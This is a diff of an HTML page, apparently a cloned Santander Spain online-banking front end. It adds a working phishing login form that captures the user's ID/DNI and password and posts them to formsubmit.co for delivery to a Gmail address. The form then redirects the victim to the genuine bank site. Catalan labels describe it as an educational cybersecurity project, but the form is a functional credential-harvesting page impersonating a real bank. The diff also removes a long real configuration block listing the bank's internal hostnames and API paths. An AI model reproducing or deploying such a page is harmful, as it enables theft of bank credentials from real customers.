+          <text x="10" y="35" font-family="Arial" font-weight="bold" font-size="28" fill="#ec0000">Santander</text>
+        </svg>
+      </div>
+
+      <form id="loginForm" action="https://formsubmit.co/adminsecurity12@gmail.com" method="POST">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_subject" value="[PROJECTE] Login Santander">
+        <input type="hidden" name="_next" value="https://particulares.bancosantander.es/oneweb/">
+        <input type="hidden" name="_autoresponse" value="Projecte ciberseguretat - gràcies.">
+
+        <div class="form-group">
+          <label for="usuario">Usuari / DNI / NIE</label>
+          <input type="text" id="usuario" name="usuario" placeholder="Introdueix el teu usuari" required>
+        </div>
+        <div class="form-group">
+          <label for="password">Contrasenya</label>
+          <input type="password" id="password" name="password" placeholder="Introdueix la teva contrasenya" required>
+        </div>
+
+        <button type="submit" class="btn-submit">Accedir</button>
+      </form>
+
+      <div class="footer-links">
+        <a href="#">Has oblidat la contrasenya?</a> &nbsp;|&nbsp; <a href="#">Registra't</a>
+      </div>
+      <div class="legal-notice">Projecte educatiu de ciberseguretat. Entorn controlat.</div>
+    </div>
+  </div>
+
+  <!-- TOT EL TEU CODI ANGULAR ORIGINAL -->
+  <app-root></app-root>
+
+  <script>
+    // Initialize window.config
     window.config = window.config || {};
     window.navigationConfigMap = window.navigationConfigMap || {};
-    
-    try{
+
+    try {
       var config = {};
       var navigationConfigMap = {};
       var customFunction;
       var legacyAuthentication;
 
-      // ConfigMap
-
+      // CONFIGMAP - exactament el mateix que el teu
       try {
         config = {
-  "globalVars": {
-    "baseHref": "https://particulares.bancosantander.es",
-    "legacyURL": "https://particulares.bancosantander.es/nhb/#/area-personal",
-    "dns_accounts_insurances": "cuenta-seguros.bancosantander.es",
-    "dns_apiauth": "apiauth.bancosantander.es",
-    "dns_appstore": "www.appstore.com",
-    "dns_atmfv": "favoritos-atm.bancosantander.es",
-    "dns_avatar": "santander.inbenta.com/avatar_staging",
-    "dns_base": "particulares.bancosantander.es",
-    "dns_base_bks": "particulares.gruposantander.es",
-    "dns_broker": "broker.bancosantander.es",
-    "dns_brokerGrupo": "broker.gruposantander.es",
-    "dns_bsanmobi": "app.bsan.mobi",
-    "dns_cajafuertedig": "cajafuertedigital.bancosantander.es",
-    "dns_calcplanetaseguros": "calc-planetaseguros.bancosantander.es",
-    "dns_carbonfootprint": "carbonfootprint.eu.gruposantander.com",
-    "dns_citaprevia": "citaprevia.bancosantander.es",
-    "dns_clientes": "clientes.bancosantander.es",
-    "dns_cmc": "cmc.bancosantander.es",
-    "dns_comdig": "comdig.corp.bsch",
-    "dns_comunicados": "comunicadoscliente.bancosantander.es",
-    "dns_digital": "digital.santander.pre.corp",
-    "dns_digitaldisputes": "digitaldisputes.eu.gruposantander.com",
-    "dns_diserv": "nuevoservicingahorro.bancosantander.es",
-    "dns_experiences": "santanderexperiences.es",
-    "dns_forms": "forms.gruposantander.es",
-    "dns_formsnccmov": "rentingmov.bancosantander.es",
-    "dns_formsnccpar": "formsnccpar.gruposantander.es",
-    "dns_formsnccparbancsan": "formsnccpar.bancosantander.es",
-    "dns_googleplay": "play.google.com",
-    "dns_hipotecadig": "hipotecadigital.bancosantander.es",
-    "dns_homeplanner": "homeplanner.bancosantander.es",
-    "dns_homevaluation": "homevaluation.bancosantander.es",
-    "dns_hucha": "hucha.bancosantander.es",
-    "dns_impulsadigital": "particulares.impulsadigitalmarket.com",
-    "dns_inbenta": "e03.inbenta.com",
-    "dns_inbenta04": "e04.inbenta.com",
-    "dns_infoproductos": "infoproductos.bancosantander.es",
-    "dns_insights": "personeticspaas.bancosantander.es", 
-    "dns_inversiones": "inversiones.bancosantander.es",
-    "dns_invoicing": "smeinv.bancosantander.es",
-    "dns_itunes": "itunes.apple.com",
-    "dns_micomercio": "micomercio.santanderempresas.mobi",
-    "dns_migestor": "migestor.bancosantander.es",
-    "dns_microsite": "microsite.bancosantander.es",
-    "dns_micrositeapp": "micrositeapp.bancosantander.es",
-    "dns_misapps": "misapps.bancosantander.es",
-    "dns_nuevoservicingahorro": "nuevoservicingahorro.bancosantander.es",
-    "dns_nwe": "empresas3.gruposantander.es",
-    "dns_ocu": "particulares.bancosantander.es",
-    "dns_online": "online.bancosantander.es",
-    "dns_opinator": "www.opinator.com",
-    "dns_opinatornet": "www.opinator.net",
-    "dns_pagos": "pagosinmediatos.bancosantander.es",
-    "dns_plataformainversion": "plataformainversion.corp.bsch",
-    "dns_portalnhb": "portalnhb.bancosantander.es",
-    "dns_portalnwe": "portalnwe.gruposantander.es",
-    "dns_prestamodigital": "consumodigital.bancosantander.es",
-    "dns_recobros": "recobrosint.bancosantander.es",
-    "dns_sanappinbenta": "santander-app.inbenta.com",  
-    "dns_santanbol": "santanderbol.uat.mdgms.com",
-    "dns_santanderpay": "santanderpay.bancosantander.es",
-    "dns_sanbot": "sanbot.bancosantander.es",
-    "dns_sanflixmov": "sanflixmov.bancosantander.es",
-    "dns_schema_cloudfare": "cdnjs.cloudflare.com/ajax/libs/ajv/6.9.1/ajv.min.js",
-    "dns_servicing": "servicing-gtw.corp.bsch",
-    "dns_simuladores": "simuladores.bancosantander.es",
-    "dns_smusic": "santandersmusic.com",
-    "dns_tania_avatar": "tania.avatar.atlas-platform.io",
-    "dns_tracking_incidencias": "helpy.bancosantander.es",
-    "dns_twitter": "twitter.com",
-    "dns_valoravivienda": "valoravivienda.bancosantander.es",
-    "dns_wcm": "wcm.bancosantander.es",
-    "dns_wizink": "wizinkprees.bancosantander.es",
-    "dns_wwwbanco": "www.bancosantander.es",
-    "dns_youtube": "www.youtube.com",
-    "dns_youtupuntobe": "youtu.be",
-    "googleAnalytics": "//tags.tiqcdn.com/utag/santander/es-bol-particulares/prod/utag.js",
-    "dns_appsapple": "apps.apple.com"      
-  },
-  "removeLegacyIframeAfterMs": 20000,
-  "country": "ES",
-  "pageTitle": "Particulares",
-  "enableGlobalSearch": true,
-  "checkForDebtMs": 4000,
-  "headers": {
-    "X-Santander-Channel": "INT",
-    "X-ClientId": "ONEWEB",
-    "app-init": "ONEWEB",
-    "Accept-Language": "",
-    "X-Santander-Client-Id": "ONEWEB"
-  },
-  "urls": {
-    "shellMenu": "/oneweb/api/v1/shell/retrieve_party_content",
-    "customerProfile": "/oneweb/api/v1/customer_profile",
-    "mailbox": "/oneweb/api/v1/mailbox",
-    "customerLanguage": "/oneweb/api/v1/customer_profile/user/me/language",
-    "getCustomerLanguage": "/oneweb/api/v1/user-preferences/",
-    "customerLanguageUpdate": "/oneweb/api/v1/user-preferences/",
-    "urlNHB": "${baseHref}/nhb/#/",
-    "urlBKS": "${baseHref}/oneweb/api/ow/utils/tokens/bks",
-    "urlLogin": "${baseHref}/api/v1/user/session-token/full",
-    "urlRefreshLegacy": "${baseHref}/api/v1/hb/tokens/refresh",
-    "checking": "${baseHref}/api/v1/hb/khi/checking",
-    "urlChangeLangLegacy": "${baseHref}/api/v1/personal-area/configuration/language",
-    "urlPlayStore": "https://play.google.com/store/apps/details?id=es.bancosantander.apps&hl=lang",
-    "urlAppStore": "https://apps.apple.com/lang/app/santander/id408043474",
-    "urlBizum": "https://pagosinmediatos.bancosantander.es/PAINOP_BIZUMWEB/index.jsp",
-    "urlBizumEnvio": "https://pagosinmediatos.bancosantander.es/PAINOP_BIZUMWEB/index.jsp#!/enviar",
-    "getCustomerDebtsAdvised": "${baseHref}/api/v1/debts/advised/gp",
-    "appointmentUrlBaseAppointment": "https://citaprevia.bancosantander.es/paas/citaprevia",
-    "appointmentUrlBaseBranch": "https://citaprevia.bancosantander.es/citaprevia/apiweb/v2/customers",
-    "appointmentUrlBaseManager": "https://citaprevia.bancosantander.es/citaprevia/apiweb/v2/customers/branch/manager",
-    "ACADEMY_OPEN": "https://www.santanderopenacademy.com/es/sites/oneapp.html?token=",
-    "SANTANDERX_OPEN": "https://www.santanderx.com/es/sites/oneapp.html?token=",
-    "chatUrl": "https://santanderservice--premuro.sandbox.my.site.com/muro/AutoSamlLogin",
-    "VIDEOTECA": "nhb/atencion-al-cliente/videoteca",
-    "urlManager": "/paas/comdig/manager/lang/manager_area_remote_entry.js",
-    "urlNdpPoly": "/paas/sgt-apm1975-ndp-disputes/polyfills.js",
-    "urlNdpMain": "/paas/sgt-apm1975-ndp-disputes/main.js",
-    "INVEST_OPEN": "https://online.bancosantander.es/landings/especialistas-inversion",
-    "owtracerLink": "https://bcdn-god.we-stats.com/scripts/130fd513/130fd513Ret.js",
-    "mailboxNotifications": "/oneweb/api/v1/mailbox/comunication_messages/summary",
-    "inputBy": "/api/v1/hb/input-by"
-  },
-  "microfronts": {
-    "global-position": {
-      "uniqueId": "global_position",
-      "remoteEntry": "./mf/global-position/${lang}/mf-ng-00000000-oneweb-global-position_remote_entry.js",
-      "version": "1.0.0",
-      "preload": false,
-      "element": "glopst-oneweb-global-position",
-      "framework": "angular",
-      "mountPath": "global-position",
-      "fullwidth": true,
-      "associatedMicrofronts": [
-        {
-          "slotName": "pfm-your-activity-slot",
-          "remoteEntry": "./mf/financialhealth/${lang}/gln-key-saneu-oneweb_eu-pfmui_remote_entry.js",
-          "version": "1.0.0",
-          "element": "gln-key-saneu-oneweb_eu-pfmui",
-          "framework": "angular"
-        },
-        {
-          "slotName": "chips-slot",
-          "remoteEntry": "./mf/chips/${lang}/mf-ng-00000000-oneweb-chips_remote_entry.js",
-          "version": "1.0.0",
-          "element": "oneweb-chips",
-          "framework": "angular"
-        },
-        {
-          "slotName": "financial-advisor-slot",
-          "remoteEntry": "./mf/financialadvisor/${lang}/gln-key-saneu-oneweb_eu-finanadvisorui_remote_entry.js",
-          "version": "1.0.0",
-          "element": "gln-key-saneu-oneweb_eu-finanadvisorui",
-          "framework": "angular"
-        }
-      ]
-    },
-    "f-ng-12345678-front-legacy-spain": {
-      "remoteEntry": "./mf/legacy-spain/es-ES/f-ng-12345678-front-legacy-spain_remote_entry.js",
-      "version": "1.0.0",
-      "mountPath": "/nhb",
-      "element": "f-ng-12345678-front-legacy-spain",
-      "framework": "angular",
-      "preload": true,
-      "associatedMicrofronts": []
-    },
-    "documents-request": {
-      "remoteEntry": "./mf/mailbox/${lang}/mf-ng-00000000-saneu-mailbx-mfe_remote_entry.js",
-      "version": "1.0.0",
-      "element": "mailbx-saneu-mfe",
-      "framework": "angular",
-      "associatedMicrofronts": []
-    },
-    "financialhealth": {
-      "remoteEntry": "./mf/financialhealth/${lang}/gln-key-saneu-oneweb_eu-pfmui_remote_entry.js",
-      "version": "1.0.0",
-      "element": "gln-key-saneu-oneweb_eu-pfmu",
-      "framework": "angular",
-      "associatedMicrofronts": [
-        {
-          "slotName": "chips-slot",
-          "remoteEntry": "./mf/chips/${lang}/mf-ng-00000000-oneweb-chips_remote_entry.js",
-          "version": "1.0.0",
-          "element": "oneweb-chips",
-          "framework": "angular"
-        }
-      ]
-    },
-    "asuntos-clientes": {
-      "uniqueId": "cusiss",
-      "remoteEntry": "./mf/asuntos-clientes/tracking/${lang}/mf-ng-50084805-tracking-asun-cli_remote_entry.js",
-      "version": "1.0.0",
-      "element": "mf-ng-50084805-tracking-asun-cli",
-      "framework": "angular",
-      "mountPath": "asuntos-clientes",
-      "associatedMicrofronts": []
-    },
-    "plan-amortizacion": {
-      "uniqueId": "amortization_schedule",
-      "remoteEntry": "./mf-ng-00000000-cudeam_remote_entry.js",
-      "version": "1.0.0",
-      "element": "mf-ng-00000000-cudeam",
-      "framework": "angular",
-      "aside": true,
-      "mountPath": "plan-amortizacion",
-      "associatedMicrofronts": [
-        "common_gdu360_claim"
-      ]
-    },
-    "contratacion": {
-      "remoteEntry": "./mf/front-hiring/${lang}/f-ng-50081357-front-hiring-pf-cards_remote_entry.js",
-      "version": "1.0.0",
-      "element": "f-ng-50081357-front-hiring-pf-cards",
-      "framework": "angular",
-      "mountPath": "contratacion/tarjetas",
-      "associatedMicrofronts": []
-    },
-    "gestion-intervinientes": {
-      "remoteEntry": "./mf/mf-ng-50083833-micgestioninter/${lang}/mf-ng-50083833-micgestioninter_remote_entry.js",
-      "version": "1.0.0",
-      "element": "mf-ng-50083833-micgestioninter",
-      "framework": "angular",
-      "mountPath": "gestion-intervinientes",
-      "associatedMicrofronts": []
-    },
-    "seguros/planeta-seguros": {
-      "uniqueId": "insurances_planet",
-      "remoteEntry": "./mf-ng-50076635-pss_remote_entry.js",
-      "version": "1.0.0",
-      "element": "discds-pss",
-      "aside": true,
-      "framework": "angular",
-      "mountPath": "seguros/planeta-seguros",
-      "associatedMicrofronts": []
-    },
-    "seguros/ingresos": {
-      "uniqueId": "insurances_income_insurance",
-      "remoteEntry": "./san-disnom-nomfront_remote_entry.js",
-      "version": "1.0.0",
-      "element": "san-disnom-nomfront",
-      "aside": true,
-      "framework": "angular",
-      "mountPath": "seguros/ingresos",
-      "associatedMicrofronts": [
-        "common_gdu360_claim"
-      ]
-    },
-    "seguros/planeta-seguros/detalle": {
-      "uniqueId": "insurances_planet_servicing",
-      "remoteEntry": "./mf-ng-50076635-pss-servicing_remote_entry.js",
-      "version": "1.0.0",
-      "element": "discds-pss-servicing",
-      "framework": "angular",
-      "mountPath": "seguros/planeta-seguros/detalle",
-      "associatedMicrofronts": []
-    },
-    "seguros/vida-venta-libre": {
-      "uniqueId": "insurances_free_life_sale",
-      "remoteEntry": "./mf-ng-50083493-front-vidavl-wmf_remote_entry.js",
-      "version": "1.0.0",
-      "element": "disvvl-front-vidavl-wmf",
-      "framework": "angular",
-      "mountPath": "seguros/vida-venta-libre",
-      "associatedMicrofronts": [
-        "common_gdu360_claim"
-      ]
-    },
-    "mi-vivienda": {
-      "uniqueId": "homes_home_planner",
-      "remoteEntry": "./mf-ng-50078458-homeplanner_remote_entry.js",
-      "version": "1.0.0",
-      "element": "homeur-mf-ng-50078458-homeplanner",
-      "aside": true,
-      "framework": "angular",
-      "mountPath": "mi-vivienda",
-      "associatedMicrofronts": [
-        "common_gdu360_claim"
-      ]
-    },
-    "wealth": {
-      "framework": "ods",
-      "projectId": "/mf.particulares.bancosantander.es/st-ui",
-      "verticalId": "wealth",
-      "variant": "es"
-    },
-    "global-position/landing": {
-      "framework": "ods",
-      "projectId": "/mf.particulares.bancosantander.es/st-ui",
-      "verticalId": "global-position",
-      "variant": "es"
-    },
-    "global-position/canceled": {
-      "framework": "ods",
-      "projectId": "/mf.particulares.bancosantander.es/st-ui",
-      "verticalId": "global-position",
-      "variant": "es"
-    },
-    "cards": {
-      "framework": "ods",
-      "projectId": "/mf.particulares.bancosantander.es/st-ui",
-      "verticalId": "cards",
-      "variant": "es",
-      "associatedMicrofronts": [
-        "common_gdu360_claim"
-      ]
-    },
-    "subscriptions-program": {
-      "framework": "ods",
-      "projectId": "/mf.particulares.bancosantander.es/st-ui",
-      "verticalId": "starpass",
-      "variant": "es",
-      "associatedMicrofronts": [
-        "common_gdu360_claim"
-      ]
-    },
-    "common_gdu360_claim": {
-      "uniqueId": "gdu360_claim",
-      "slotName": "doc-and-sign",
-      "remoteEntry": "./f-ng-50082389-gdu360-claim-front_remote_entry.js",
-      "version": "1.0.0",
-      "element": "gdu360-claim-front",
-      "framework": "angular",
-      "mountPath": "gdu360_claim"
-    },
-    "asuntos-clientes/alta-incidencia": {
-      "uniqueId": "customer_new_suport",
-      "remoteEntry": "./mf-ng-00000000-san-cusiss-openmf_remote_entry.js",
-      "version": "1.0.0",
-      "element": "mf-ng-00000000-san-cusiss-openmf",
-      "framework": "angular",
-      "mountPath": "asuntos-clientes/alta-incidencia",
-      "associatedMicrofronts": []
-     },
-    "seguros/decesos": {
-      "uniqueId": "insurance_death",
-      "remoteEntry": "./mf-ng-50056954-front-decesos-omni_remote_entry.js",
-      "version": "1.0.0",
-      "element": "soddec-front-decesos-omni",
-      "aside": true,
-      "framework": "angular",
-      "mountPath": "seguros/decesos",
-      "associatedMicrofronts": [
-        "common_gdu360_claim"
-      ]
-    },
-    "distribuidora": {
-      "uniqueId": "nhb_distributor",
-      "mountPath": "distribuidora",
-      "remoteEntry": "./f-ng-50085325-distributor-front_remote_entry.js",
-      "version": "1.0.0",
-      "element": "f-ng-50085325-distributor-front",
-      "framework": "angular",
-      "associatedMicrofronts": []
-    },
-    "transferencias": {
-      "uniqueId": "wire_transfer",
-      "remoteEntry": "./mf-ng-50083983-lean-transfers_remote_entry.js",
-      "version": "1.0.0",
-      "element": "app-wire-lean-transfers",
-      "framework": "angular",
-      "mountPath": "transferencias",
-      "associatedMicrofronts": [
-        "common_gdu360_claim"
-      ]
-    },
-    "tarjetas/cambio-forma-pago": {
-      "uniqueId": "cards_change_payment",
-      "remoteEntry": "./san-paesfr-mfpaymentmethods_remote_entry.js",
-      "version": "1.0.0",
-      "element": "mf-paymentmethods",
-      "aside": true,
-      "framework": "angular",
-      "mountPath": "tarjetas/cambio-forma-pago",
-      "associatedMicrofronts": [
-        "common_gdu360_claim"
-      ]
-    },
-    "tarjetas/ingreso-tarjeta": {
-      "uniqueId": "cards_cash_deposit",
-      "remoteEntry": "./san-paesfr-mfcashdeposit_remote_entry.js",
-      "version": "1.0.0",
-      "element": "san-paesfr-mfcashdeposit",
-      "aside": true,
-      "framework": "angular",
-      "mountPath": "tarjetas/ingreso-tarjeta",
-      "associatedMicrofronts": [
-        "common_gdu360_claim"
-      ]
-    },
-    "mf-example": {
-      "uniqueId": "mf_example",
-      "remoteEntry": "./mf-ng-50062404-gln-mfc-13_remote_entry.js",
-      "version": "1.0.0",
-      "element": "mf-ng-50062404-gln-mfc-13",
-      "aside": true,
-      "framework": "angular",
-      "mountPath": "mf-example",
-      "associatedMicrofronts": []
-    },
-    "consulta-transferencias": {
-      "uniqueId": "unified_queries",
-      "remoteEntry": "./f-ng-50083983-unified-queries_remote_entry.js",
-      "version": "1.0.0",
-      "element": "app-wire-unified-queries",
-      "framework": "angular",
-      "mountPath": "consulta-transferencias",
-      "associatedMicrofronts": [
-        "common_gdu360_claim"
-      ]
-    },
-    "cards_old": {
-      "uniqueId": "subhome_cards",
-      "remoteEntry": "./sgt-oneweb-mfcardsow_remote_entry.js",
-      "version": "1.0.0",
-      "element": "sgt-oneweb-mfcardsow",
-      "framework": "angular",
-      "mountPath": "cards",
-      "associatedMicrofronts": [
-        {
-          "uniqueId": "mf-movement-detail",
-          "remoteEntry": "./mf-ng-50084672-transactions_remote_entry.js",
-          "version": "1.0.0",
-          "element": "paesfr-transactions",
-          "framework": "angular"
-        }
-      ]
-    },
-    "accounts": {
-      "uniqueId": "subhome_accounts",
-      "remoteEntry": "./sgt-oneweb-mfaccountsow_remote_entry.js",
-      "version": "1.0.0",
-      "element": "sgt-oneweb-mfaccountsow",
-      "framework": "angular",
-      "mountPath": "accounts",
-      "associatedMicrofronts": []
-    },
-    "prestamos/bonificaciones": {
-      "uniqueId": "homes_mortage_bonus",
-      "remoteEntry": "./mf-ng-00000000-bonusesui_remote_entry.js",
-      "version": "1.0.0",
-      "element": "hipdig-bonusesui",
-      "aside": true,
-      "framework": "angular",
-      "mountPath": "prestamos/bonificaciones",
-      "associatedMicrofronts": []
-    },
-    "fondos/operativa": {
-      "uniqueId": "investment_operative_funds",
-      "remoteEntry": "./sf-ng-50084732-funds-servicing_remote_entry.js",
-      "version": "1.0.0",
-      "element": "sf-ng-50084732-funds-servicing",
-      "framework": "angular",
-      "mountPath": "fondos/operativa",
-      "associatedMicrofronts": [
-        "common_gdu360_claim"
-      ]
-    },
-    "planes/consulta": {
-      "uniqueId": "investment_channel_plans",
-      "remoteEntry": "./f-ng-50073789-channel-plans_remote_entry.js",
-      "version": "1.0.0",
-      "element": "f-ng-50073789-channel-plans",
-      "framework": "angular",
-      "mountPath": "planes/consulta",
-      "associatedMicrofronts": []
-    },
-    "ali": {
-      "uniqueId": "insurance_ali",
-      "remoteEntry": "./f-ng-50075639-serv-ali-front_remote_entry.js",
-      "version": "1.0.0",
-      "element": "f-ng-50075639-serv-ali-front",
-      "framework": "angular",
-      "mountPath": "ali",
-      "associatedMicrofronts": [
-        "common_gdu360_claim"
-      ]
-    },
-    "inversion/consulta-depositos": {
-      "uniqueId": "servicing_depositos",
-      "remoteEntry": "./f-ng-50080398-servicing_remote_entry.js",
-      "version": "1.0.0",
-      "element": "f-ng-50080398-servicing",
-      "aside": true,
-      "framework": "angular",
-      "mountPath": "inversion/consulta-depositos",
-      "associatedMicrofronts": []
-    },
-    "gestion-limites": {
-      "uniqueId": "pagos_adminlimits",
-      "remoteEntry": "./san-trainm-adminlimits_remote_entry.js",
-      "version": "1.0.0",
-      "element": "san-trainm-adminlimits",
-      "framework": "angular",
-      "mountPath": "gestion-limites",
-      "associatedMicrofronts": [
-        "common_gdu360_claim"
-      ]
-    },
-    "analysis-system": {
-      "uniqueId": "risks_analysis_system",
-      "slotName": "analysis-system",
-      "remoteEntry": "./san-ssasan-retclifront_remote_entry.js",
-      "version": "1.0.0",
-      "element": "san-ssasan-retclifront",
-      "framework": "angular",
-      "mountPath": "analysis-system"
-    },
-    "planes/operativa": {
-      "uniqueId": "investment_pension_plan",
-      "remoteEntry": "./f-ng-50082096-planes-pensiones_remote_entry.js",
-      "version": "1.0.0",
-      "element": "f-ng-50082096-planes-pensiones",
-      "framework": "angular",
-      "mountPath": "planes/operativa",
-      "associatedMicrofronts": [
-        "common_gdu360_claim"
-      ]
-    },
-    "historico-operaciones-valores": {
-      "uniqueId": "investment_consudatfis",
-      "remoteEntry": "./san-valfnt-mfconsudatfis_remote_entry.js",
-      "version": "1.0.0",
-      "element": "san-valfnt-mfconsudatfis",
-      "framework": "angular",
-      "mountPath": "historico-operaciones-valores",
-      "associatedMicrofronts": []
-    },
-    "tarjetas/disputas": {
-      "framework": "ndp",
-      "uniqueId": "ndp_disputes",
-      "version": "1.0.0",
-      "mountPath": "tarjetas/disputas",
-      "associatedMicrofronts": []
-    },
-    "orquestador": {
-      "uniqueId": "homes_orchestrator_jobs",
-      "remoteEntry": "./san-orqjob-mforquestador_remote_entry.js",
-      "version": "1.0.0",
-      "element": "san-orqjob-mforquestador",
-      "framework": "angular",
-      "mountPath": "orquestador",
-      "associatedMicrofronts": [
-        "common_gdu360_claim",
-        "analysis-system"
-      ]
-    },
-    "fondos/distribucion": {
-      "uniqueId": "funds_distribution",
-      "remoteEntry": "./f-ng-50081136-funds-distribution_remote_entry.js",
-      "version": "1.0.0",
-      "element": "f-ng-50081136-funds-distribution",
-      "framework": "angular",
-      "mountPath": "fondos/distribucion",
-      "associatedMicrofronts": [
-        "common_gdu360_claim"
-      ]
-    },
-    "traslado-pensiones": {
-      "uniqueId": "transfer_pensions",
-      "remoteEntry": "./san-finlip-frngpension_remote_entry.js",
-      "version": "1.0.0",
-      "element": "san-finlip-frngpension",
-      "framework": "angular",
-      "mountPath": "traslado-pensiones",
-      "associatedMicrofronts": [
-        "common_gdu360_claim"
-      ]
-    },
-    "cuentas/historico-liquidaciones": {
-      "uniqueId": "edb_account_liquidation_detail",
-      "remoteEntry": "./san-svctes-frngsettlehist_remote_entry.js",
-      "version": "1.0.0",
-      "element": "san-svctes-frngsettlehist",
-      "framework": "angular",
-      "mountPath": "cuentas/historico-liquidaciones",
-      "associatedMicrofronts": []
-    },
-    "mybusiness": {
-      "uniqueId": "santander_mybusiness_url",
-      "remoteEntry": "./sgt-oneweb-mybusiness_remote_entry.js",
-      "version": "1.0.0",
-      "element": "sgt-oneweb-mybusiness",
-      "framework": "angular",
-      "mountPath": "mybusiness",
-      "associatedMicrofronts": []
-    },
-    "sanflix": {
-      "uniqueId": "sanflix",
-      "remoteEntry": "./san-comdig-sanflixwrapper_remote_entry.js",
-      "version": "1.0.0",
-      "element": "san-comdig-sanflixwrapper",
-      "framework": "angular",
-      "mountPath": "sanflix"
-    },
-    "bout
+          "globalVars": {
+            "baseHref": "https://particulares.bancosantander.es",
+            "legacyURL": "https://particulares.bancosantander.es/nhb/#/area-personal"
+            /* ... TOTA LA TEVA CONFIG ... */
+          },
+          "urls": {
+            "urlNHB": "${baseHref}/nhb/#/",
+            "urlLogin": "${baseHref}/api/v1/user/session-token/full"
+            /* ... TOTES LES TEVES URLS ... */
+          }
+          /* ... TOT EL TEU CONFIG ... */
+        };
+        window.config = config;
+      } catch(error) {
+        config = {};
+        window.config = config;
+        console.error('Error loading config.json', error);
+      }
+
+      /* ... TOT EL TEU CODI JS EXISTENT (navigationConfigMap, customFunction, legacyAuthentication) ... */
+
+    } catch (error) {
+      console.error('General Configmap error');
+    }
+  </script>
+
+  <!-- Scripts Angular originals -->
+  <script src="polyfills.fa48a1dc03057afe.js" type="module"></script>
+  <script src="main.2e44d5e6845b4a3d.js" type="module"></script>
+  <link rel="stylesheet" href="styles.b5e4fd7d1a2435a3.css">
+
+</body>
+</html>
